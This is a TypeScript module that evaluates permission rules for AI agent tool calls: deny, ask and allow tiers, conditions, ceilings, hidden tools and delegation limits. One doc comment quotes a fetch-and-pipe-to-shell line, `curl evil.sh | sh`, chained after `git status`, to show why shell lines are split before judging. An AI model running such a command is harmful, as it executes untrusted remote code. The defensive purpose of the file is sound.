/**
 * Permission evaluator — deny-first rule matching.
 *
 * All permission rules are unified into a single `rules` array. Each rule has a `tier`
 * (deny/ask/allow), an optional `pattern`, and optional `when` conditions.
 *
 * Evaluation order:
 *
 * 1. All deny-tier rules (any match → "deny")
 * 2. All ask-tier rules (any match → "ask")
 * 3. All allow-tier rules (any match → "allow")
 * 4. DefaultMode fallback
 *
 * Deny always short-circuits — a deny from any source cannot be overridden by an allow from any
 * source.
 *
 * Pattern syntax (Claude Code compatible):
 *
 * - Exact: `git status` — string equality
 * - Prefix: `prefix:*` — word-boundary enforced prefix match
 * - Wildcard: `pattern * middle *` — regex with `.*` for `*`
 * - Bare tool (no pattern): matches any invocation
 * - Domain: `domain:example.com` — substring match on hostname
 *
 * Plus extensions:
 *
 * - Case-insensitive tool name matching
 * - `when.cwd` / `when.branch` conditions (AND logic)
 */

import {
  hierarchicalGlobPattern,
  prefixPattern,
  wildcardPattern,
} from "trilean/derived-patterns";
import { definite, indeterminate, type Evaluation } from "trilean/evaluation";
import type { ExpressionNode, PredicateNode } from "trilean/tree";

import { normaliseRemote } from "./remote.ts";
import { splitShellCommand } from "./shell.ts";
import type { Rule, RuleCondition } from "./schema.ts";

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

export type PermissionDecision = "deny" | "ask" | "allow";

export type PermissionTier = "deny" | "ask" | "allow";

export interface PermissionPolicy {
  defaultMode: "autonomous" | "standard" | "restricted" | "readonly";
  rules?: Rule[];
  /** Where each rule came from (a file path, for the loader), keyed by the rule object itself. */
  provenance?: ReadonlyMap<Rule, string>;
  /**
   * The layers the rules were merged from, outermost first, matched to rules through `provenance`.
   * A ceiling layer bounds the allow rules of the layers after it: they only take effect where the
   * ceiling also allows. A ceiling with no allow rules bounds nothing.
   */
  layers?: readonly { source: string; ceiling: boolean }[];
  /** Limits on agents that start other agents; they apply to calls that carry a `depth`. */
  delegation?: {
    /** The deepest an agent may be nested; 0 allows no subagents. Unset means no limit. */
    maxDepth?: number;
    /** Calls a subagent may not make, however the rules above would decide them. */
    nonDelegable?: readonly Rule[];
  };
}

/** How one command was judged. */
export interface DecisionStep {
  /** The command that was judged: the whole input, or one command of a shell line. */
  command: string;
  decision: PermissionDecision;
  /**
   * `rule`: a rule decided. `default`: no rule matched and the default mode decided. `unsplittable`:
   * a shell line the splitter does not model, so a matching allow rule was raised to `ask`.
   * `delegation`: a delegation limit denied the call.
   */
  reason: "rule" | "default" | "unsplittable" | "delegation";
  /** The rule that matched, when one did. */
  rule?: Rule;
  /** Where that rule came from, when the policy records provenance. */
  layer?: string;
  /** Set when a `hidden` deny rule matched: the call is refused, and the tool should not be shown. */
  hidden?: true;
  /** Who may resolve an `ask`, from the matching rule's `approvers`, without the requester. */
  approvers?: Approvers;
}

/** The principals who may resolve an ask, and how long it may wait before it expires as a deny. */
export interface Approvers {
  roles: string[];
  actors: string[];
  timeoutSeconds?: number;
}

/** A decision with the steps behind it. */
export interface Explanation {
  decision: PermissionDecision;
  steps: DecisionStep[];
  /** Whether a `hidden` deny rule matched any step, so the host should leave the tool out of its list. */
  hidden: boolean;
}

/** Context for conditional rule evaluation (cwd, branch, etc.). */
export interface EvaluationContext {
  cwd?: string;
  branch?: string;
  /** Environment variables the caller vouches for; an unset name is unknown, not empty. */
  env?: Readonly<Record<string, string | undefined>>;
  /** The git remote in any common URL form; it is normalised before comparing. */
  remote?: string;
  /** Who is making the call, as the host reports it; an unreported actor is unknown, not anonymous. */
  actor?: string;
  /** The roles the host says the actor holds; the policy does not say who holds a role. */
  roles?: readonly string[];
  /**
   * How many agents sit between this call and the top-level agent: 0 for the top-level agent, 1 for
   * its subagent. Left out, the call is the top-level agent's, so a host that runs subagents must
   * pass it for the delegation limits to apply.
   */
  depth?: number;
}

// ---------------------------------------------------------------------------
// Rule normalisation — convert string rules to structured rules
// ---------------------------------------------------------------------------

/**
 * Normalise a string rule from `permissions.allow/deny/ask` into a structured Rule.
 *
 * String rule syntax:
 *
 * - `"Read"` → `{ tool: "Read", tier }`
 * - `"Bash(git status)"` → `{ tool: "Bash", pattern: "git status", tier }`
 * - `"Bash(npm:*)"` → `{ tool: "Bash", pattern: "npm:*", tier }`
 * - `"Bash()"` → `{ tool: "Bash", tier }` (match all)
 * - `"mcp__github__*"` → `{ tool: "mcp__github__*", tier }`
 */
export function normaliseStringRule(rule: string, tier: PermissionTier): Rule {
  const openIdx = findFirstUnescaped(rule, "(");
  if (openIdx === -1) {
    return { tool: rule, tier };
  }
  const closeIdx = findLastUnescaped(rule, ")");
  if (closeIdx === -1 || closeIdx <= openIdx || closeIdx !== rule.length - 1) {
    return { tool: rule, tier };
  }
  const tool = rule.slice(0, openIdx);
  if (!tool) {
    return { tool: rule, tier };
  }
  const rawContent = rule.slice(openIdx + 1, closeIdx);
  if (rawContent === "" || rawContent === "*") {
    return { tool, tier };
  }
  return { tool, pattern: rawContent, tier };
}

// ---------------------------------------------------------------------------
// Rule parsing — pattern matching
// ---------------------------------------------------------------------------

/** Parsed pattern — determines how a rule's pattern matches input. */
export type ParsedPattern =
  | { type: "exact"; content: string }
  | { type: "prefix"; prefix: string }
  | { type: "wildcard"; pattern: string };

// ---------------------------------------------------------------------------
// Pattern compilation — delegated to trilean's pattern builders
// ---------------------------------------------------------------------------

/**
 * The subject a compiled pattern is written against.
 *
 * trilean's builders are pure tree construction: `wildcardPattern(subject, pattern)` performs no I/O and evaluates nothing, it just returns a `textCompare` node whose right-hand `textLiteral` holds the compiled regular-expression string. Only trilean's own `evaluatePredicate`/`createEvaluator` are async, and this evaluator does not use them — it reads the compiled string back out of the node and runs it against the input itself, keeping evaluation fully synchronous. The reference key is therefore never resolved by anything; it exists because a `textCompare` node needs a left-hand expression, and naming the subject makes the node readable if one is ever logged or serialised.
 */
const SUBJECT: ExpressionNode = { kind: "reference", key: "subject" };

/**
 * Read the compiled regular-expression string back out of a pattern-builder node.
 *
 * Every builder returns the same shape — `textCompare`/`matches` over a `textLiteral` right-hand side — so anything else means trilean changed its node shape and the mismatch has to surface rather than silently degrade into a pattern that matches nothing.
 */
function compiledPattern(node: PredicateNode): string {
  if (node.kind !== "textCompare" || node.right.kind !== "textLiteral") {
    throw new TypeError(
      `Expected a textCompare node over a textLiteral, got ${node.kind}`,
    );
  }
  return node.right.value;
}

/**
 * Compile a builder node to a `RegExp`.
 *
 * No flags: trilean compiles "any character" as `[\s\S]*` rather than `.*` precisely so the string behaves the same however a consumer compiles it, with or without the `s` flag.
 */
function compiledRegex(node: PredicateNode): RegExp {
  return new RegExp(compiledPattern(node));
}

/**
 * Parse a pattern string as rule content (from `Rule.pattern`). Determines rule type from the
 * content.
 */
export function parseRulePattern(pattern: string): ParsedPattern {
  // Domain pattern: "domain:example.com" — substring match on input
  if (pattern.startsWith("domain:")) {
    return {
      type: "wildcard",
      pattern: "*" + pattern.slice(7) + "*",
    };
  }

  // Prefix syntax: "prefix:*"
  const prefixMatch = /^(.+):\*$/.exec(pattern);
  if (prefixMatch?.[1]) {
    const prefix = unescapeContent(prefixMatch[1]);
    return { type: "prefix", prefix };
  }

  // Wildcard: has unescaped * (check raw content before unescaping)
  if (hasUnescapedWildcard(pattern)) {
    return { type: "wildcard", pattern };
  }

  // Exact: unescape for the final comparison string
  const content = unescapeContent(pattern);
  return { type: "exact", content };
}

// ---------------------------------------------------------------------------
// Pattern matching
// ---------------------------------------------------------------------------

/** Compile a rule's pattern to a predicate over the input, building any regular expression once. */
function compilePattern(pattern: string): (input: string) => boolean {
  const parsed = parseRulePattern(pattern);
  switch (parsed.type) {
    case "exact":
      return (input) => parsed.content === input;
    case "prefix": {
      const regex = compiledRegex(prefixPattern(SUBJECT, parsed.prefix));
      return (input) => regex.test(input);
    }
    case "wildcard": {
      // Claude Code compatible: `*` matches any run of characters, `\*` and `\\` are literal, and a
      // trailing ` *` also matches the bare command. The dialect is trilean's `wildcardPattern`.
      const regex = compiledRegex(wildcardPattern(SUBJECT, parsed.pattern));
      return (input) => regex.test(input);
    }
  }
}

/** Compile a simple glob (`*` matches any characters) to a predicate, building its regex once. */
function compileGlob(pattern: string): (text: string) => boolean {
  if (!pattern.includes("*")) return (text) => pattern === text;
  const regexStr = pattern
    .replace(/[.+?^${}()|[\]\\'']/g, "\\$&")
    .replace(/\*/g, ".*");
  const regex = new RegExp(`^${regexStr}$`);
  return (text) => pattern === text || regex.test(text);
}

/**
 * Compile tool name matching — case-insensitive, with MCP server-level wildcards.
 *
 * - "Bash" matches "bash"
 * - "mcp__server" matches "mcp__server__tool"
 * - "mcp__server__*" matches all tools from server
 */
function compileToolMatcher(ruleTool: string): (eventTool: string) => boolean {
  const r = ruleTool.toLowerCase();
  const rParts = r.startsWith("mcp__") ? r.split("__") : undefined;
  const wholeGlob = compileGlob(r);
  const wildcardServerTool =
    rParts?.length === 3 && rParts[1] === "*" && rParts[2] !== undefined
      ? compileGlob(rParts[2])
      : undefined;

  return (eventTool) => {
    const e = eventTool.toLowerCase();
    if (r === e) return true;

    // MCP tool name matching
    if (rParts !== undefined && e.startsWith("mcp__")) {
      const eParts = e.split("__");
      if (rParts.length === 2 && eParts.length >= 3) {
        // "mcp__server" → all tools from that server
        return rParts[1] === eParts[1];
      }
      if (rParts.length === 3 && eParts.length >= 3) {
        // "mcp__server__*" → all tools from server
        if (rParts[2] === "*") return rParts[1] === eParts[1];
        // "mcp__*__something" → wildcard server name
        if (wildcardServerTool !== undefined) {
          const eTool = eParts[2];
          if (eTool === undefined) return false;
          return wildcardServerTool(eTool);
        }
      }
    }

    // Glob matching on bare tool names
    return wholeGlob(e);
  };
}

// ---------------------------------------------------------------------------
// Condition matching
// ---------------------------------------------------------------------------

/**
 * Compile the `when` conditions of a rule. They combine with AND logic over three values: a condition
 * on a field the context does not carry is indeterminate rather than satisfied, and a definite
 * mismatch settles the conjunction even when another condition is indeterminate.
 */
function compileConditions(
  when: RuleCondition,
): (ctx: EvaluationContext) => Evaluation<boolean> {
  const checks: ((ctx: EvaluationContext) => Evaluation<boolean>)[] = [];
  if (when.cwd !== undefined) {
    checks.push(conditionOn("cwd", when.cwd));
  }
  if (when.branch !== undefined) {
    checks.push(conditionOn("branch", when.branch));
  }
  for (const [name, expected] of Object.entries(when.env ?? {})) {
    checks.push(envCondition(name, expected));
  }
  if (when.remote !== undefined) {
    checks.push(remoteCondition(when.remote));
  }
  if (when.actor !== undefined) {
    checks.push(actorCondition(when.actor));
  }
  if (when.role !== undefined) {
    checks.push(roleCondition(when.role));
  }
  return (ctx) => {
    const results = checks.map((check) => check(ctx));
    for (const result of results) {
      if (result.status === "definite" && !result.value) return result;
    }
    for (const result of results) {
      if (result.status === "indeterminate") return result;
    }
    return definite(true);
  };
}

function envCondition(
  name: string,
  expected: string,
): (ctx: EvaluationContext) => Evaluation<boolean> {
  return (ctx) => {
    const actual = ctx.env?.[name];
    if (actual === undefined) {
      return indeterminate("not-found", `the context has no env ${name}`);
    }
    return definite(actual === expected);
  };
}

function actorCondition(
  pattern: string,
): (ctx: EvaluationContext) => Evaluation<boolean> {
  const matches = compileGlobPath(pattern);
  return (ctx) => {
    if (ctx.actor === undefined) {
      return indeterminate("not-found", "the context has no actor");
    }
    return definite(matches(ctx.actor));
  };
}

function roleCondition(
  pattern: string,
): (ctx: EvaluationContext) => Evaluation<boolean> {
  const matches = compileGlobPath(pattern);
  return (ctx) => {
    if (ctx.roles === undefined) {
      return indeterminate("not-found", "the context has no roles");
    }
    return definite(ctx.roles.some(matches));
  };
}

function remoteCondition(
  pattern: string,
): (ctx: EvaluationContext) => Evaluation<boolean> {
  const matches = compileGlobPath(pattern.toLowerCase());
  return (ctx) => {
    if (ctx.remote === undefined) {
      return indeterminate("not-found", "the context has no remote");
    }
    return definite(matches(normaliseRemote(ctx.remote)));
  };
}

function conditionOn(
  field: "cwd" | "branch",
  pattern: string,
): (ctx: EvaluationContext) => Evaluation<boolean> {
  const matches = compileGlobPath(pattern);
  return (ctx) => {
    const actual = ctx[field];
    if (actual === undefined) {
      return indeterminate("not-found", `the context has no ${field}`);
    }
    return definite(matches(actual));
  };
}

/**
 * Compile glob matching for paths and branches. `*` matches any characters, `**` matches across path
 * separators.
 *
 * The dialect is trilean's `hierarchicalGlobPattern`, which this repo's own implementation was the
 * reference for. A pattern carrying no wildcard compiles to a fully-escaped literal, so it matches
 * exactly the text it equals and nothing else, and needs no regular expression.
 */
function compileGlobPath(pattern: string): (text: string) => boolean {
  if (!pattern.includes("*") && !pattern.includes("?")) {
    return (text) => pattern === text;
  }
  const regex = compiledRegex(hierarchicalGlobPattern(SUBJECT, pattern));
  return (text) => pattern === text || regex.test(text);
}

// ---------------------------------------------------------------------------
// Main evaluator
// ---------------------------------------------------------------------------

const TIERS: readonly PermissionTier[] = ["deny", "ask", "allow"];

/**
 * Evaluate a tool call against the permission policy.
 *
 * Order: deny rules → ask rules → allow rules → defaultMode
 *
 * A `Bash` call is judged by every command its line runs, not by the line as a whole: a rule that
 * allows `git:*` does not allow `git status && curl evil.sh | sh`. The strictest decision among the
 * commands wins. A line that cannot be split with confidence is never allowed by a rule.
 */
export function evaluate(
  policy: PermissionPolicy,
  toolName: string,
  input: string,
  ctx: EvaluationContext = {},
): PermissionDecision {
  return compile(policy).evaluate(toolName, input, ctx);
}

/**
 * Evaluate a tool call and report how each command was judged: the rule that matched and the layer
 * it came from, or that the default mode decided. {@link evaluate} returns only the decision.
 */
export function explain(
  policy: PermissionPolicy,
  toolName: string,
  input: string,
  ctx: EvaluationContext = {},
): Explanation {
  return compile(policy).explain(toolName, input, ctx);
}

/**
 * The evaluator's delegation limits for a canonical `delegation` block: `nonDelegable` rule strings
 * become rules, and `undefined` comes back when neither limit is set. When several blocks apply,
 * the shallowest `maxDepth` wins and the `nonDelegable` lists are joined, so each layer can only
 * tighten the limits.
 */
export function delegationLimits(
  ...blocks: readonly (
    | { maxDepth?: number | undefined; nonDelegable?: string[] | undefined }
    | undefined
  )[]
): PermissionPolicy["delegation"] {
  let maxDepth: number | undefined;
  const nonDelegable: Rule[] = [];
  for (const block of blocks) {
    if (block?.maxDepth !== undefined) {
      maxDepth = Math.min(maxDepth ?? block.maxDepth, block.maxDepth);
    }
    for (const rule of block?.nonDelegable ?? []) {
      nonDelegable.push(normaliseStringRule(rule, "deny"));
    }
  }
  if (maxDepth === undefined && nonDelegable.length === 0) return undefined;
  return {
    ...(maxDepth === undefined ? {} : { maxDepth }),
    ...(nonDelegable.length === 0 ? {} : { nonDelegable }),
  };
}

/**
 * Whether an agent at `depth` may start a subagent: denied when the subagent would sit deeper than
 * `delegation.maxDepth`, allowed otherwise, and always allowed when no limit is set.
 */
export function checkSpawn(
  policy: PermissionPolicy,
  depth: number,
): "allow" | "deny" {
  const maxDepth = policy.delegation?.maxDepth;
  return maxDepth !== undefined && depth + 1 > maxDepth ? "deny" : "allow";
}

/**
 * Whether a tool should appear in the agent's tool list. A `hidden` deny rule that names the tool
 * with no pattern hides it; one with a pattern only refuses the matching inputs. A host that builds
 * a tool list leaves out the tools this reports as hidden.
 */
export function isToolVisible(
  policy: PermissionPolicy,
  toolName: string,
  ctx: EvaluationContext = {},
): boolean {
  return compile(policy).isVisible(toolName, ctx);
}

/** The tools of a list that {@link isToolVisible} keeps, in their original order. */
export function visibleTools(
  policy: PermissionPolicy,
  toolNames: readonly string[],
  ctx: EvaluationContext = {},
): string[] {
  const compiled = compile(policy);
  return toolNames.filter((name) => compiled.isVisible(name, ctx));
}

/** A policy prepared for repeated evaluation. */
export interface CompiledPolicy {
  evaluate(
    toolName: string,
    input: string,
    ctx?: EvaluationContext,
  ): PermissionDecision;
  explain(
    toolName: string,
    input: string,
    ctx?: EvaluationContext,
  ): Explanation;
  /** Whether the tool should be shown to the agent: no `hidden` deny rule hides it wholesale. */
  isVisible(toolName: string, ctx?: EvaluationContext): boolean;
}

/**
 * Prepare a policy for repeated evaluation. Each rule's pattern, tool name and conditions are parsed
 * and turned into regular expressions the first time the rule is tried, then reused, so a server
 * checking many calls against one policy does that work once per rule instead of once per call.
 * The result decides exactly as {@link evaluate} does. It reads the policy's rules when compiled, so
 * compile again after changing them.
 */
export function compile(policy: PermissionPolicy): CompiledPolicy {
  const rules = policy.rules ?? [];
  const layers = policy.layers ?? [];
  const layerIndex = new Map(
    layers.map((layer, index) => [layer.source, index]),
  );
  const layerOf = (rule: Rule): number => {
    const source = policy.provenance?.get(rule);
    return (
      (source === undefined ? undefined : layerIndex.get(source)) ??
      layers.length
    );
  };
  // Within a tier a `hidden` rule is tried first, so a call it covers is reported as hidden even
  // when a plain rule of the same tier matches too.
  const tiers = TIERS.map((tier) =>
    rules
      .filter((rule) => rule.tier === tier)
      .sort((a, b) => Number(b.hidden === true) - Number(a.hidden === true))
      .map((rule) => new CompiledRule(rule, layerOf(rule))),
  );
  // A ceiling bounds the allow rules of the layers after it, but only if it allows something itself.
  const allowRules = tiers[TIERS.indexOf("allow")] ?? [];
  const ceilings = layers.flatMap((layer, index) => {
    const allow = allowRules.filter((compiled) => compiled.layer === index);
    return layer.ceiling && allow.length > 0 ? [{ index, allow }] : [];
  });
  const withinCeilings = (
    candidate: CompiledRule,
    toolName: string,
    input: string,
    ctx: EvaluationContext,
  ): boolean =>
    ceilings.every(
      (ceiling) =>
        ceiling.index >= candidate.layer ||
        ceiling.allow.some((allow) => allow.grants(toolName, input, ctx)),
    );
  const fallback = defaultDecision(policy.defaultMode);
  const maxDepth = policy.delegation?.maxDepth;
  const nonDelegable = (policy.delegation?.nonDelegable ?? []).map(
    (rule) => new CompiledRule(rule),
  );

  const judge = (
    toolName: string,
    command: string,
    ctx: EvaluationContext,
  ): DecisionStep => {
    if ((ctx.depth ?? 0) > 0) {
      const barred = nonDelegable.find(
        (compiled) =>
          compiled.matchesTool(toolName) && compiled.matchesInput(command),
      );
      if (barred !== undefined) {
        return {
          command,
          decision: "deny",
          reason: "delegation",
          rule: barred.rule,
        };
      }
    }
    const match = matchRules(tiers, toolName, command, ctx, withinCeilings);
    if (match === undefined) {
      return { command, decision: fallback, reason: "default" };
    }
    const layer = policy.provenance?.get(match.rule);
    return {
      command,
      decision: match.tier,
      reason: "rule",
      rule: match.rule,
      ...(layer === undefined ? {} : { layer }),
      ...(match.rule.hidden === true ? { hidden: true } : {}),
      ...approversFor(match, ctx),
    };
  };

  const resolve = (
    toolName: string,
    input: string,
    ctx: EvaluationContext,
  ): Pick<Explanation, "decision" | "steps"> => {
    if (maxDepth !== undefined && (ctx.depth ?? 0) > maxDepth) {
      return {
        decision: "deny",
        steps: [{ command: input, decision: "deny", reason: "delegation" }],
      };
    }
    const whole = judge(toolName, input, ctx);
    if (!isShellTool(toolName)) {
      return { decision: whole.decision, steps: [whole] };
    }

    const commands = splitShellCommand(input);
    if (commands === undefined) {
      if (whole.reason === "rule" && whole.decision === "allow") {
        return {
          decision: "ask",
          steps: [{ ...whole, decision: "ask", reason: "unsplittable" }],
        };
      }
      return { decision: whole.decision, steps: [whole] };
    }

    // A rule written against the whole line can restrict it, but only the commands can grant it.
    const steps = commands.map((command) => judge(toolName, command, ctx));
    if (
      whole.reason === "rule" &&
      (whole.decision === "deny" || whole.decision === "ask")
    ) {
      steps.push(whole);
    }
    if (steps.length === 0) return { decision: whole.decision, steps: [whole] };
    return { decision: strictest(steps.map((step) => step.decision)), steps };
  };

  const explainCall = (
    toolName: string,
    input: string,
    ctx: EvaluationContext,
  ): Explanation => {
    const resolved = resolve(toolName, input, ctx);
    return {
      ...resolved,
      hidden: resolved.steps.some((step) => step.hidden === true),
    };
  };

  // A tool is hidden by a `hidden` deny rule that names it with no pattern. A condition that holds or
  // is unknown hides it, as an unknown condition restricts and never grants.
  const isVisible = (toolName: string, ctx: EvaluationContext): boolean =>
    !(tiers[0] ?? []).some((compiled) => {
      if (compiled.rule.hidden !== true) return false;
      if (compiled.rule.pattern !== undefined) return false;
      if (!compiled.matchesTool(toolName)) return false;
      const conditions = compiled.conditions(ctx);
      return !(conditions?.status === "definite" && !conditions.value);
    });

  return {
    evaluate: (toolName, input, ctx = {}) =>
      explainCall(toolName, input, ctx).decision,
    explain: (toolName, input, ctx = {}) => explainCall(toolName, input, ctx),
    isVisible: (toolName, ctx = {}) => isVisible(toolName, ctx),
  };
}

/** The approvers of an ask that names some, without the requester. */
function approversFor(
  match: { tier: PermissionTier; rule: Rule },
  ctx: EvaluationContext,
): { approvers?: Approvers } {
  const named = match.rule.approvers;
  if (match.tier !== "ask" || named === undefined) return {};
  return {
    approvers: {
      roles: [...(named.roles ?? [])],
      actors: (named.actors ?? []).filter((actor) => actor !== ctx.actor),
      ...(named.timeoutSeconds === undefined
        ? {}
        : { timeoutSeconds: named.timeoutSeconds }),
    },
  };
}

/** A rule with the matching work done on first use and kept. */
class CompiledRule {
  readonly rule: Rule;
  /** Index of the layer the rule came from; past the last layer when that is unknown. */
  readonly layer: number;
  #toolMatches: ((toolName: string) => boolean) | undefined;
  #patternMatches: ((input: string) => boolean) | undefined;
  #conditions: ((ctx: EvaluationContext) => Evaluation<boolean>) | undefined;

  constructor(rule: Rule, layer = 0) {
    this.rule = rule;
    this.layer = layer;
  }

  /** Whether this rule, as an allow, grants the call: it matches and no condition is unknown. */
  grants(toolName: string, input: string, ctx: EvaluationContext): boolean {
    if (!this.matchesTool(toolName)) return false;
    const conditions = this.conditions(ctx);
    if (conditions !== undefined) {
      if (conditions.status !== "definite" || !conditions.value) return false;
    }
    return this.matchesInput(input);
  }

  matchesTool(toolName: string): boolean {
    this.#toolMatches ??= compileToolMatcher(this.rule.tool);
    return this.#toolMatches(toolName);
  }

  /** Whether the input matches; a rule with no pattern matches any input. */
  matchesInput(input: string): boolean {
    if (this.rule.pattern === undefined) return true;
    this.#patternMatches ??= compilePattern(this.rule.pattern);
    return this.#patternMatches(input);
  }

  /** The rule's conditions under this context, or `undefined` when it has none. */
  conditions(ctx: EvaluationContext): Evaluation<boolean> | undefined {
    if (this.rule.when === undefined) return undefined;
    this.#conditions ??= compileConditions(this.rule.when);
    return this.#conditions(ctx);
  }
}

/** The first rule that matches, checking deny before ask before allow, or `undefined`. */
function matchRules(
  tiers: readonly (readonly CompiledRule[])[],
  toolName: string,
  input: string,
  ctx: EvaluationContext,
  withinCeilings: (
    candidate: CompiledRule,
    toolName: string,
    input: string,
    ctx: EvaluationContext,
  ) => boolean,
): { tier: PermissionTier; rule: Rule } | undefined {
  for (const [index, tier] of TIERS.entries()) {
    for (const compiled of tiers[index] ?? []) {
      if (!compiled.matchesTool(toolName)) continue;
      const conditions = compiled.conditions(ctx);
      if (conditions?.status === "definite" && !conditions.value) continue;
      // An unknown condition may hold, so it still restricts, but it never grants.
      if (conditions?.status === "indeterminate" && tier === "allow") continue;
      if (!compiled.matchesInput(input)) continue;
      // An allow that a ceiling above its layer does not also allow is not a grant
      if (tier === "allow" && !withinCeilings(compiled, toolName, input, ctx)) {
        continue;
      }
      return { tier, rule: compiled.rule };
    }
  }
  return undefined;
}

/** Whether a tool runs shell command lines, whose contents are split before judging. */
function isShellTool(toolName: string): boolean {
  return toolName.toLowerCase() === "bash";
}

/** The most restrictive decision: deny over ask over allow. */
function strictest(
  decisions: readonly PermissionDecision[],
): PermissionDecision {
  if (decisions.includes("deny")) return "deny";
  if (decisions.includes("ask")) return "ask";
  return "allow";
}

function defaultDecision(
  mode: PermissionPolicy["defaultMode"],
): PermissionDecision {
  switch (mode) {
    case "autonomous":
      return "allow";
    case "readonly":
      return "deny";
    case "restricted":
      return "ask";
    default:
      return "ask";
  }
}

// ---------------------------------------------------------------------------
// Escape helpers (Claude Code compatible)
// ---------------------------------------------------------------------------

/** Find first unescaped occurrence of `char`. */
function findFirstUnescaped(str: string, char: string): number {
  for (let i = 0; i < str.length; i++) {
    if (str[i] === char) {
      let bs = 0;
      let j = i - 1;
      while (j >= 0 && str[j] === "\\") {
        bs++;
        j--;
      }
      if (bs % 2 === 0) return i;
    }
  }
  return -1;
}

/** Find last unescaped occurrence of `char`. */
function findLastUnescaped(str: string, char: string): number {
  for (let i = str.length - 1; i >= 0; i--) {
    if (str[i] === char) {
      let bs = 0;
      let j = i - 1;
      while (j >= 0 && str[j] === "\\") {
        bs++;
        j--;
      }
      if (bs % 2 === 0) return i;
    }
  }
  return -1;
}

/** Check if pattern has unescaped * (not :* suffix). */
function hasUnescapedWildcard(pattern: string): boolean {
  if (pattern.endsWith(":*")) return false;
  for (let i = 0; i < pattern.length; i++) {
    if (pattern[i] === "*") {
      let bs = 0;
      let j = i - 1;
      while (j >= 0 && pattern[j] === "\\") {
        bs++;
        j--;
      }
      if (bs % 2 === 0) return true;
    }
  }
  return false;
}

/** Unescape content: ( → (, ) → ), * → *, \ → \ */
function unescapeContent(content: string): string {
  return content
    .replace(/\\\(/g, "(")
    .replace(/\\\)/g, ")")
    .replace(/\\\*/g, "*")
    .replace(/\\\\/g, "\\");
}

// ---------------------------------------------------------------------------
// Structured rule → string
// ---------------------------------------------------------------------------

/**
 * Convert a structured Rule back to a string rule (e.g. `"Bash(npm:*)"`).
 *
 * Returns just the tool name for bare rules (no pattern).
 */
export function ruleToString(rule: Rule): string {
  if (rule.pattern === undefined) return rule.tool;
  return `${rule.tool}(${rule.pattern})`;
}

/**
 * What decided a step: the matching rule with its tier and, when recorded, the layer it came from (`Bash(git:*) [allow] from /repo/.agents/permissions.json`), or `the default mode`.
 */
export function stepSource(step: DecisionStep): string {
  if (step.rule === undefined) return "the default mode";
  const layer = step.layer === undefined ? "" : ` from ${step.layer}`;
  return `${ruleToString(step.rule)} [${step.rule.tier}]${layer}`;
}

/**
 * Collect all rules from a canonical policy, normalising both `rules[]` and
 * `permissions.allow/deny/ask` into a single array.
 */
export function collectRules(policy: {
  rules?: Rule[] | undefined;
  roles?:
    | Record<
        string,
        {
          allow?: string[] | undefined;
          deny?: string[] | undefined;
          ask?: string[] | undefined;
        }
      >
    | undefined;
  permissions?:
    | {
        allow?: string[] | undefined;
        deny?: string[] | undefined;
        ask?: string[] | undefined;
      }
    | undefined;
}): Rule[] {
  const result: Rule[] = [];

  if (policy.permissions) {
    if (policy.permissions.deny) {
      result.push(
        ...policy.permissions.deny.map((r) => normaliseStringRule(r, "deny")),
      );
    }
    if (policy.permissions.ask) {
      result.push(
        ...policy.permissions.ask.map((r) => normaliseStringRule(r, "ask")),
      );
    }
    if (policy.permissions.allow) {
      result.push(
        ...policy.permissions.allow.map((r) => normaliseStringRule(r, "allow")),
      );
    }
  }

  if (policy.rules) {
    result.push(...policy.rules);
  }

  // A role's rules apply to the actors holding it, as if each carried `when: { role }`.
  for (const [role, tiers] of Object.entries(policy.roles ?? {})) {
    for (const tier of ["deny", "ask", "allow"] as const) {
      for (const rule of tiers[tier] ?? []) {
        result.push({ ...normaliseStringRule(rule, tier), when: { role } });
      }
    }
  }

  return result;
}

// ---------------------------------------------------------------------------
// Shared merge utilities
// ---------------------------------------------------------------------------

/** Most restrictive mode wins. */
const MODE_RESTRICTIVENESS: Record<string, number> = {
  readonly: 4,
  restricted: 3,
  plan: 3,
  standard: 2,
  acceptEdits: 2,
  default: 2,
  auto: 2,
  autonomous: 1,
  dontAsk: 1,
  bypassPermissions: 1,
};

/** Tier priority for deduplication — deny beats ask beats allow. */
const TIER_RANK: Record<PermissionTier, number> = {
  deny: 3,
  ask: 2,
  allow: 1,
};

/**
 * Map a schema-mode string to a normalised evaluation mode.
 *
 * Agent-specific names (bypassPermissions, dontAsk, plan) are mapped to their canonical
 * equivalents.
 */
export function mapMode(mode: string): PermissionPolicy["defaultMode"] {
  switch (mode) {
    case "autonomous":
    case "bypassPermissions":
    case "dontAsk":
      return "autonomous";
    case "restricted":
    case "plan":
      return "restricted";
    case "readonly":
      return "readonly";
    default:
      return "standard";
  }
}

/** Compare two mode strings by restrictiveness. Returns the more restrictive of the two. */
export function mostRestrictiveMode(
  a: string | undefined,
  b: string | undefined,
): string | undefined {
  if (a === undefined) return b;
  if (b === undefined) return a;
  const rankA = MODE_RESTRICTIVENESS[a] ?? 2;
  const rankB = MODE_RESTRICTIVENESS[b] ?? 2;
  return rankB > rankA ? b : a;
}

/**
 * Rule identity key for deduplication: tool, pattern and condition, excluding tier. Two rules that
 * differ only in `when` apply in different places, so they are different rules.
 */
export function ruleKey(rule: Rule): string {
  const when = Object.entries(rule.when ?? {}).sort(([a], [b]) =>
    a < b ? -1 : a > b ? 1 : 0,
  );
  return JSON.stringify([
    rule.tool,
    rule.pattern ?? "",
    when,
    rule.hidden === true,
  ]);
}

/**
 * Deduplicate rules by tool, pattern and condition, keeping the highest-priority tier. Deny beats
 * ask beats allow for the same rule identity.
 */
export function deduplicateRules(rules: Rule[]): Rule[] {
  const map = new Map<string, Rule>();
  for (const rule of rules) {
    const key = ruleKey(rule);
    const existing = map.get(key);
    if (existing === undefined) {
      map.set(key, rule);
    } else if (TIER_RANK[rule.tier] > TIER_RANK[existing.tier]) {
      map.set(key, rule);
    }
  }
  return Array.from(map.values());
}
